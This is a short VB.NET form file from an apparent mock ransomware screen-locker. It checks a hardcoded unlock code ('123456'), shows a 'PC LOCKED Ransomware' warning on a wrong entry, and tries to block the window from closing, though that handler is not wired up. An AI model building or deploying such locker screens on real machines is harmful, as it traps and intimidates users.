﻿Public Class Form5


    Private Sub Form5_FormClosing(sender As Object, e As FormClosingEventArgs)
        e.Cancel = True
    End Sub

    Private Sub Button1_Click_1(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        If TextBox1.Text = "123456" Then
            Form6.Show()
            Me.Hide()
        Else
            MsgBox("Wrong code! Try again!", MsgBoxStyle.Critical, " PC LOCKED Ransomware")
        End If

    End Sub

    Private Sub Form5_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub
End Class